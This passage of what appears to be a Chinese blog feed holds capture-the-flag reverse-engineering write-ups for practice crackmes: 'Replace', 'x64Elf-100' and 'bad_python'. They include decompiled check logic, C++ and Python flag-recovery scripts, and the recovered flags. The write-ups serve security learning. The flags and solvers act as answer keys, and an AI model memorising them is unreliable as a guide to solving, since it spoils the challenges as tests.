class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span>            <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span>            <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span>            <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span>            <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span>            <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span>            <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span>            <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    string byte_402150 <span class="token operator">=</span> <span class="token string">"2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6"</span><span class="token punctuation">;</span>    string byte_402151 <span class="token operator">=</span> <span class="token string">"a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6"</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> v5<span class="token punctuation">;</span>    <span class="token keyword">int</span> v6<span class="token punctuation">;</span>    <span class="token keyword">int</span> v7<span class="token punctuation">;</span>    <span class="token keyword">char</span> v8<span class="token punctuation">;</span>    <span class="token keyword">int</span> v9<span class="token punctuation">;</span>    <span class="token keyword">char</span> v10<span class="token punctuation">;</span>    <span class="token keyword">int</span> v11<span class="token punctuation">;</span>    <span class="token keyword">int</span> v12<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v8 <span class="token operator">=</span> byte_402150<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v4<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">&lt;</span> <span class="token number">48</span> <span class="token operator">||</span> v8 <span class="token operator">></span> <span class="token number">57</span> <span class="token punctuation">)</span>            v9 <span class="token operator">=</span> v8 <span class="token operator">-</span> <span class="token number">87</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            v9 <span class="token operator">=</span> v8 <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>        v11 <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">*</span> v9<span class="token punctuation">;</span>        v10 <span class="token operator">=</span> byte_402151<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v4<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v10 <span class="token operator">&lt;</span> <span class="token number">48</span> <span class="token operator">||</span> v10 <span class="token operator">></span> <span class="token number">57</span> <span class="token punctuation">)</span>            v12 <span class="token operator">=</span> v10 <span class="token operator">-</span> <span class="token number">87</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            v12 <span class="token operator">=</span> v10 <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">127</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            v6 <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">;</span>            v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>byte_4021A0<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> v6 <span class="token operator">+</span> v7<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v11 <span class="token operator">+</span> v12<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x19</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                v5 <span class="token operator">=</span> i<span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        v4<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">>=</span> <span class="token number">35</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{Th1s_1s_Simple_Rep1ac3_Enc0d3}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/weZY4qx8bKJRXIB.png" alt="攻防世界-Replace5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-Reversing-x64Elf-100</title>
      <link href="/2023/03d2284b5b.html"/>
      <url>/2023/03d2284b5b.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><mark>要能看出 v3 是一个二维字符数组</mark>，根据代码：</li></ul><pre class="language-c" data-language="c"><code class="language-c">__int64 v3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-20h]</span>v3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Dufhbmf"</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"pG`imos"</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"ewUglpt"</span><span class="token punctuation">;</span></code></pre><p>虽然定义是 <code>__int64</code> 类型，但实际根据 <code>v3[0] = &quot;Dufhbmf&quot;</code> 可知 v3 是字符 char 类型</p><ul><li><p><strong>要能读懂 <code>*(v3[i % 3] + 2 * (i / 3))</code> 表示的意思：</strong><br>  对于二维数组 <code>v3</code> 来说，<code>v3[]</code> 实际代表的也是一个首地址：<code>v3[][0]</code> 的地址，所以 <code>2 * (i / 3)</code> 其实是首地址的偏移，因此 <code>v3[i % 3] + 2 * (i / 3)</code> 代表的是 <code>v3[][]</code> 的地址，所以 <code>*(v3[i % 3] + 2 * (i / 3))</code> 代表的是 <code>v3[][]</code> 的值，即：字符串（字符数组） <code>v3[]</code> 中的一个字符</p></li><li><p><strong>在 Python 中，整数类型除法，如果除不断，结果会转化为浮点型，所以在 Python 中数组下标的 <code>2 * (i / 3)</code> 要写成 <code>2 * int (i / 3)</code></strong></p></li><li><p>找准 flag 的表示，本题循环中用 <code>*(i + a1)</code> 代表 flag 中的每一个字符，直接根据条件表示出 <code>*(i + a1)</code> 即可</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=7be710f6-2477-4035-8b60-8f91f9dffafd_2&task_category_id=4">攻防世界-Reversing-x64Elf-100</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>IDA 查看 main<br><img src="https://s2.loli.net/2023/03/18/m2OyaixvVodugKL.png" alt="攻防世界-Reversing-x64Elf-100 1.png"></p></li><li><p>输入的字符串 s 经过 <code>sub_4006FD(s)</code> 处理后若返回 0，则破解成功</p></li><li><p>查看 <code>sub_4006FD(s)</code><br><img src="https://s2.loli.net/2023/03/18/8XRKMwPkoNhHnpj.png" alt="攻防世界-Reversing-x64Elf-100 2.png"></p></li><li><p>输入的字符串 s 中的每一个字符经过 for 循环处理后，均必须满足 <code>*(v3[i % 3] + 2 * (i / 3)) - *(i + a1) == 1</code>，否则返回1，破解失败</p></li><li><p>根据代码：</p><pre class="language-c" data-language="c"><code class="language-c">__int64 v3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-20h]</span>v3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Dufhbmf"</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"pG\`imos"</span><span class="token punctuation">;</span>v3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"ewUglpt"</span><span class="token punctuation">;</span></code></pre><p>可以判断，v3 是一个二维数组【v3 是一个数组，而 v3 的每一个元素又都是一个字符串（char 数组）】</p></li><li><p>注意这里条件语句的写法：<br> <code>*(v3[i % 3] + 2 * (i / 3))</code> ，* 是加在整体上的，所以 * 表示取 <code>v3[i % 3] + 2 * (i / 3)</code> 这个地址上的值，而 v3 是一个二维数组，所以 <code>v3[i % 3]</code> 代表的其实是一个首地址，即 <code>v3[i % 3][0]</code> 的地址，后面的 <code>2 * (i / 3)</code> 其实是一个偏移量，所以 <code>*(v3[i % 3] + 2 * (i / 3))</code> 指的是 <code>v3[i % 3][2 * (i / 3)]</code> 的值</p></li><li><p>a1 是输入的字符串 s 的首地址，每一轮循环中的 <code>*(i + a1)</code> 其实就是 s 中的每一个对应元素，因此求出每一轮 <code>*(i + a1)</code> 的值就是 s 中的每一个元素的值，而 v3 中的值并未发生修改，所以根据 <code>*(v3[i % 3] + 2 * (i / 3)) - *(i + a1) == 1</code> 的条件可得：<code>*(i + a1) = *(v3[i % 3] + 2 * (i / 3)) - 1，即： *(i + a1) = v3[i % 3][2 * (i / 3)] - 1</code></p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    string v3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Dufhbmf"</span><span class="token punctuation">;</span>    v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"pG`imos"</span><span class="token punctuation">;</span>    v3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"ewUglpt"</span><span class="token punctuation">;</span>    string flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        flag <span class="token operator">+=</span> v3<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout<span class="token operator">&lt;&lt;</span>flag<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre class="language-python" data-language="python"><code class="language-python">checker <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Dufhbmf"</span><span class="token punctuation">,</span> <span class="token string">"pG`imos"</span><span class="token punctuation">,</span> <span class="token string">"ewUglpt"</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>checker<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>Code_Talkers</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/j4fA89IgzaVrhlR.png" alt="攻防世界-Reversing-x64Elf-100 3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-bad_python</title>
      <link href="/2023/0370b440f7.html"/>
      <url>/2023/0370b440f7.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>熟悉 <mark>python 逆向中反编译工具 uncompyle6</mark> 的使用方法</p></li><li><p>了解 <mark>.pyc 文件头</mark>的结构</p></li><li><p>通过自己<mark>手动生成对应 python 版本的 .pyc 文件来修复文件头</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=c5796270-3b28-11ed-9802-fa163e4fa66d&task_category_id=4">攻防世界-bad_python</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>解压得到一个 .pyc 的 Python 反编译文件</p></li><li><p>用本机 uncompyle6 反编译失败，提示 KeyError: ‘3.10.4’，本机用的 Python 版本是 3.10.4，应该是 Python 版本不对</p></li><li><p>根据文件名“pyre.cpython-36.pyc”，应该是提示该文件由 python 3.6 编译而来<br><img src="https://s2.loli.net/2023/03/18/8vqrEdpR4SKIowx.png" alt="攻防世界-bad_python1.png"></p></li><li><p>拖到 win10 虚拟机，安装 Python 3.6.0，pip install uncompyle6</p></li><li><p>用虚拟机的 uncompyle6 反编译<br><img src="https://s2.loli.net/2023/03/18/OY9jRq3lt4mgbHX.png" alt="攻防世界-bad_python2.png"></p></li><li><p>编译失败，提示：</p><pre class="language-c" data-language="c"><code class="language-c">assert <span class="token function">iscode</span><span class="token punctuation">(</span>co<span class="token punctuation">)</span><span class="token punctuation">,</span> f<span class="token string">""</span><span class="token string">"&#123;co&#125; does not smell like code"</span><span class="token string">""</span>AssertionError<span class="token operator">:</span> None does not smell like code</code></pre></li><li><p>用记事本打开，内容是乱码，用 exeinfo pe 查看，发现并未识别成 .pyc 文件<br><img src="https://s2.loli.net/2023/03/18/9T7uzgske1wVQh5.png" alt="攻防世界-bad_python3.png"></p></li><li><p>用 WinHex 查看文件头很奇怪，应该是文件头被修改<br><img src="https://s2.loli.net/2023/03/18/8U7sbuhmFA5qSyi.png" alt="攻防世界-bad_python4.png"></p></li></ol><blockquote><p>按照网上给的 pyc 文件头：03 F3 0D 0A，修改之后发现没什么用</p></blockquote><ol start="9"><li><p>pyc 文件头占文件最开始的 16字节，只需修改第一行即可。并且 <mark>pyc 文件头好像并不固定</mark>，比如文件头包含：python 的版本、文件修改时间等信息<br><img src="https://s2.loli.net/2023/03/18/v8zld1j6afsiBrA.png" alt="攻防世界-bad_python5.png"></p></li><li><p>尝试自己生成一个由 python 3.6.0 版本编译的 .pyc 文件，再将正常的文件头拷过来，恢复损坏的文件</p></li><li><p>随意创建一个 python 文件，使用 <code>python -m py_compile C:\Users\wyy\Desktop\My_test.py</code> 生成 .pyc<br> <img src="https://s2.loli.net/2023/03/18/3NLghortEx6wZRq.png" alt="攻防世界-bad_python6.png"></p></li><li><p>成功后，会在 .py 文件夹下生成一个 <code>__pycache__</code> 文件夹<br><img src="https://s2.loli.net/2023/03/18/r4IsptUwMZqAKky.png" alt="攻防世界-bad_python7.png"></p></li><li><p>查看自己生成的 pyc 文件的文件头，正常<br><img src="https://s2.loli.net/2023/03/18/VhC4F7Pw5BD2pMm.png" alt="攻防世界-bad_python8.png"></p></li><li><p>用正常的文件头数据替换掉损坏文件的第一行，再次编译，编译成功<br><img src="https://s2.loli.net/2023/03/18/pASwrvWJa5Z2eRE.png" alt="攻防世界-bad_python9.png"></p></li><li><p>将代码复制出来：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>    v0 <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    v1 <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span>v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sum1 <span class="token operator">=</span> c_uint32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    delta <span class="token operator">=</span> <span class="token number">195935983</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v0<span class="token punctuation">.</span>value <span class="token operator">+=</span> <span class="token punctuation">(</span>v1<span class="token punctuation">.</span>value <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token operator">^</span> v1<span class="token punctuation">.</span>value <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> v1<span class="token punctuation">.</span>value <span class="token operator">^</span> sum1<span class="token punctuation">.</span>value <span class="token operator">+</span> k<span class="token punctuation">[</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        sum1<span class="token punctuation">.</span>value <span class="token operator">+=</span> delta        v1<span class="token punctuation">.</span>value <span class="token operator">+=</span> <span class="token punctuation">(</span>v0<span class="token punctuation">.</span>value <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token operator">^</span> v0<span class="token punctuation">.</span>value <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> v0<span class="token punctuation">.</span>value <span class="token operator">^</span> sum1<span class="token punctuation">.</span>value <span class="token operator">+</span> k<span class="token punctuation">[</span><span class="token punctuation">(</span>sum1<span class="token punctuation">.</span>value <span class="token operator">>></span> <span class="token number">9</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>     v0<span class="token punctuation">.</span>value<span class="token punctuation">,</span> v1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'please input your flag:'</span><span class="token punctuation">)</span>    k <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wrong!'</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v1 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        v2 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        a <span class="token operator">+=</span> encrypt<span class="token punctuation">(</span><span class="token punctuation">[</span>v1<span class="token punctuation">,</span> v2<span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span>    enc <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token number">4006073346</span><span class="token punctuation">,</span> <span class="token number">2582197823</span><span class="token punctuation">,</span> <span class="token number">2235293281</span><span class="token punctuation">,</span> <span class="token number">558171287</span><span class="token punctuation">,</span> <span class="token number">2425328816</span><span class="token punctuation">,</span> <span class="token number">1715140098</span><span class="token punctuation">,</span> <span class="token number">986348143</span><span class="token punctuation">,</span> <span class="token number">1948615354</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> 